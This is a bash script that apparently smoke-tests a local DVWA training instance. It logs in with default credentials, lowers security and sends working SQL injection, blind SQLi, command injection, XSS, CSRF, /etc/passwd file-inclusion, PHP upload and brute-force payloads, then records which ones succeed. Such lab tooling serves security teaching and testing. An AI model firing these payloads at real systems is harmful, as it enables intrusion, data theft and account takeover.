#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${DVWA_BASE_URL:-http://localhost:4280}"
USER="${DVWA_USER:-admin}"
PASS="${DVWA_PASS:-password}"
COOKIE_FILE=".dvwa_cookies.txt"
RESULTS_FILE="${DVWA_RESULTS_FILE:-dvwa_results.md}"

extract_token() {
  sed -nE "s/.*name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"].*/\1/p" | head -n1
}

fetch_page() {
  local path="$1"
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL$path"
}

setup_db() {
  local token out
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/setup.php" | extract_token)
  [[ -n "${token:-}" ]] || { echo "[FAIL] setup token not found"; exit 1; }

  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/setup.php" \
    --data-urlencode "create_db=Create / Reset Database" \
    --data-urlencode "user_token=$token")

  if grep -qiE "created|success|table" <<<"$out"; then
    echo "[OK] database reset completed"
  else
    echo "[WARN] setup response did not contain explicit success markers"
  fi
}

login() {
  local token out
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/login.php" | extract_token)
  [[ -n "${token:-}" ]] || { echo "[FAIL] login token not found"; exit 1; }

  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/login.php" \
    --data-urlencode "username=$USER" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "Login=Login" \
    --data-urlencode "user_token=$token")

  if grep -qi "login failed" <<<"$out"; then
    echo "[FAIL] login failed"
    exit 1
  fi

  if ! grep -qi "logout" <<<"$out"; then
    echo "[WARN] login success marker (logout) not seen; session may still be valid"
  fi
  echo "[OK] authenticated session prepared"
}

set_security() {
  local level="$1" token out
  token=$(fetch_page "/security.php" | extract_token)
  [[ -n "${token:-}" ]] || { echo "[FAIL] security token not found"; exit 1; }

  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/security.php" \
    --data-urlencode "security=$level" \
    --data-urlencode "seclev_submit=Submit" \
    --data-urlencode "user_token=$token")

  if grep -qi "Security level set to $level" <<<"$out"; then
    echo "[OK] security=$level"
  else
    echo "[WARN] unable to confirm security=$level from response"
  fi
}

set_security_low() { set_security low; }

init_results() {
  cat > "$RESULTS_FILE" <<'MD'
# DVWA Smoke Results (Part A)

| Vulnerability | Module | Method | Payload/Action | Indicator | Status |
|---|---|---|---|---|---|
MD
}

record_result() {
  printf "| %s | %s | %s | %s | %s | %s |\n" "$1" "$2" "$3" "$4" "$5" "$6" >> "$RESULTS_FILE"
}

sqli() {
  local base inj c1 c2
  base=$(fetch_page "/vulnerabilities/sqli/?id=1&Submit=Submit")
  inj=$(fetch_page "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit")
  c1=$(grep -o "First name:" <<<"$base" | wc -l | tr -d ' ')
  c2=$(grep -o "First name:" <<<"$inj" | wc -l | tr -d ' ')

  if [[ "$c2" -gt "$c1" ]]; then
    echo "[WARN] SQLi likely vulnerable (rows increased $c1 -> $c2)"
    record_result "SQL Injection (Classic)" "/vulnerabilities/sqli/" "GET" "id=1' OR '1'='1" "Returned more rows than baseline" "WARN (vulnerable)"
  else
    echo "[OK] SQLi payload did not increase result set"
    record_result "SQL Injection (Classic)" "/vulnerabilities/sqli/" "GET" "id=1' OR '1'='1" "No row inflation observed" "OK/UNCLEAR"
  fi
}

sqli_blind() {
  local t_base t_slow
  t_base=$(curl -fsS -o /dev/null -w "%{time_total}" -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli_blind/?id=1&Submit=Submit")
  t_slow=$(curl -fsS -o /dev/null -w "%{time_total}" -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli_blind/?id=1%27%20AND%20SLEEP(2)%23&Submit=Submit" || true)

  if awk "BEGIN{exit !($t_slow-$t_base > 1.5)}"; then
    echo "[WARN] Blind SQLi likely vulnerable (timing delta: base=$t_base slow=$t_slow)"
    record_result "Blind SQL Injection" "/vulnerabilities/sqli_blind/" "GET" "id=1' AND SLEEP(2)#" "Timing increased significantly" "WARN (vulnerable)"
  else
    echo "[OK] Blind SQLi timing delta not conclusive (base=$t_base slow=$t_slow)"
    record_result "Blind SQL Injection" "/vulnerabilities/sqli_blind/" "GET" "id=1' AND SLEEP(2)#" "Timing not significantly different" "OK/UNCLEAR"
  fi
}

cmdi() {
  local body
  body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/exec/" --data-urlencode "ip=127.0.0.1;id" --data-urlencode "Submit=Submit")
  if grep -qiE "uid=|gid=" <<<"$body"; then
    echo "[WARN] Command injection likely vulnerable"
    record_result "Command Injection" "/vulnerabilities/exec/" "POST" "ip=127.0.0.1;id" "uid/gid command output present" "WARN (vulnerable)"
  else
    echo "[OK] command output not observed"
    record_result "Command Injection" "/vulnerabilities/exec/" "POST" "ip=127.0.0.1;id" "No injected command marker" "OK/UNCLEAR"
  fi
}

xss_r() {
  local body raw encoded
  body=$(fetch_page "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E")
  raw=0; encoded=0
  grep -Fq "<script>alert(1)</script>" <<<"$body" && raw=1
  grep -Fq "&lt;script&gt;alert(1)&lt;/script&gt;" <<<"$body" && encoded=1
  if [[ "$raw" -eq 1 ]]; then
    echo "[WARN] reflected XSS likely vulnerable (raw script reflected)"
    record_result "Reflected XSS" "/vulnerabilities/xss_r/" "GET" "name=<script>alert(1)</script>" "Raw script reflected" "WARN (vulnerable)"
  else
    echo "[OK] reflected XSS not raw-reflected (encoded=$encoded)"
    record_result "Reflected XSS" "/vulnerabilities/xss_r/" "GET" "name=<script>alert(1)</script>" "Payload not reflected raw" "OK/UNCLEAR"
  fi
}

xss_s() {
  local marker body
  marker="DVWA_XSSS_$(date +%s)"
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/xss_s/" \
    --data-urlencode "txtName=<script>${marker}</script>" \
    --data-urlencode "mtxMessage=stored" \
    --data-urlencode "btnSign=Sign Guestbook" >/dev/null
  body=$(fetch_page "/vulnerabilities/xss_s/")
  if grep -Fq "<script>${marker}</script>" <<<"$body"; then
    echo "[WARN] stored XSS likely vulnerable"
    record_result "Stored XSS" "/vulnerabilities/xss_s/" "POST" "txtName=<script>marker</script>" "Script marker persisted in response" "WARN (vulnerable)"
  else
    echo "[OK] stored XSS not confirmed"
    record_result "Stored XSS" "/vulnerabilities/xss_s/" "POST" "txtName=<script>marker</script>" "Raw script marker not found" "OK/UNCLEAR"
  fi
}

csrf() {
  local body
  body=$(fetch_page "/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change")
  if grep -q "Password Changed" <<<"$body"; then
    echo "[WARN] CSRF likely vulnerable"
    record_result "CSRF" "/vulnerabilities/csrf/" "GET" "password_new=password&...&Change=Change" "Password changed via direct GET" "WARN (vulnerable)"
  else
    echo "[OK] CSRF not confirmed by direct GET"
    record_result "CSRF" "/vulnerabilities/csrf/" "GET" "password_new=password&...&Change=Change" "No state change message" "OK/UNCLEAR"
  fi
}

lfi() {
  local body
  body=$(fetch_page "/vulnerabilities/fi/?page=../../../../../../etc/passwd")
  if grep -q "root:x:" <<<"$body"; then
    echo "[WARN] LFI likely vulnerable"
    record_result "File Inclusion (LFI/RFI)" "/vulnerabilities/fi/" "GET" "page=../../../../../../etc/passwd" "passwd marker found" "WARN (vulnerable)"
  else
    echo "[OK] LFI not confirmed"
    record_result "File Inclusion (LFI/RFI)" "/vulnerabilities/fi/" "GET" "page=../../../../../../etc/passwd" "No passwd marker" "OK/UNCLEAR"
  fi
}

upload() {
  local tmp body file body2
  file="dvwa_upload_test_$(date +%s).php"
  tmp=$(mktemp)
  printf '<?php echo "UPLOAD_MARKER"; ?>' > "$tmp"
  body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/upload/" \
    -F "uploaded=@$tmp;filename=$file;type=application/x-php" \
    -F "Upload=Upload")
  rm -f "$tmp"
  body2=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL/hackable/uploads/$file" || true)

  if grep -qi "succesfully uploaded" <<<"$body" || grep -q "UPLOAD_MARKER" <<<"$body2"; then
    echo "[WARN] unrestricted upload likely vulnerable"
    record_result "Unrestricted File Upload" "/vulnerabilities/upload/" "POST multipart" "upload .php file" "Upload accepted and/or marker reachable" "WARN (vulnerable)"
  else
    echo "[OK] upload rejection observed"
    record_result "Unrestricted File Upload" "/vulnerabilities/upload/" "POST multipart" "upload .php file" "Upload not accepted / marker unreachable" "OK/UNCLEAR"
  fi
}

brute() {
  local i out blocked=0
  for i in $(seq 1 10); do
    out=$(fetch_page "/vulnerabilities/brute/?username=admin&password=wrong$i&Login=Login")
    grep -qiE "too many|locked|rate" <<<"$out" && blocked=1
  done
  if [[ "$blocked" -eq 1 ]]; then
    echo "[OK] brute-force control indicators present"
    record_result "Weak Brute-Force Protection" "/vulnerabilities/brute/" "GET" "10 rapid invalid logins" "Rate-limit/lockout text detected" "OK/UNCLEAR"
  else
    echo "[WARN] brute-force protection likely weak"
    record_result "Weak Brute-Force Protection" "/vulnerabilities/brute/" "GET" "10 rapid invalid logins" "No lockout/rate-limit indicators" "WARN (vulnerable)"
  fi
}

weak_id() {
  local i headers v vals=() monotonic=1
  for i in $(seq 1 10); do
    headers=$(curl -fsSI -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/weak_id/")
    v=$(grep -i '^set-cookie: dvwaSession=' <<<"$headers" | sed -E 's/.*dvwaSession=([^;]+).*/\1/I' | tail -n1)
    [[ -n "${v:-}" ]] && vals+=("$v")
  done
  if [[ "${#vals[@]}" -lt 3 ]]; then
    monotonic=0
  else
    for i in $(seq 1 $((${#vals[@]}-1))); do
      if ! [[ "${vals[$((i-1))]}" =~ ^[0-9]+$ && "${vals[$i]}" =~ ^[0-9]+$ ]]; then monotonic=0; break; fi
      if [[ $((vals[i])) -ne $((vals[i-1]+1)) ]]; then monotonic=0; break; fi
    done
  fi

  if [[ "$monotonic" -eq 1 ]]; then
    echo "[WARN] weak session id likely vulnerable (${vals[*]})"
    record_result "Weak Session ID" "/vulnerabilities/weak_id/" "POST" "10 session generations" "Monotonic numeric session IDs" "WARN (vulnerable)"
  else
    echo "[OK] no strict monotonic session-id pattern detected"
    record_result "Weak Session ID" "/vulnerabilities/weak_id/" "POST" "10 session generations" "No strict monotonic sequence" "OK/UNCLEAR"
  fi
}

full() {
  init_results
  setup_db
  login
  set_security low

  sqli
  sqli_blind
  cmdi
  xss_r
  xss_s
  csrf
  lfi
  upload
  brute
  weak_id

  echo "[OK] smoke run complete -> $RESULTS_FILE"
}

case "${1:-}" in
  setup_db) setup_db ;;
  login) login ;;
  set_security_low) set_security low ;;
  set_security) set_security "${2:-low}" ;;
  sqli) sqli ;;
  sqli_blind) sqli_blind ;;
  cmdi) cmdi ;;
  xss_r) xss_r ;;
  xss_s) xss_s ;;
  csrf) csrf ;;
  lfi) lfi ;;
  upload) upload ;;
  brute) brute ;;
  weak_id) weak_id ;;
  full) full ;;
  *)
    echo "Usage: $0 {setup_db|login|set_security_low|set_security <level>|sqli|sqli_blind|cmdi|xss_r|xss_s|csrf|lfi|upload|brute|weak_id|full}"
    exit 1
    ;;
esac
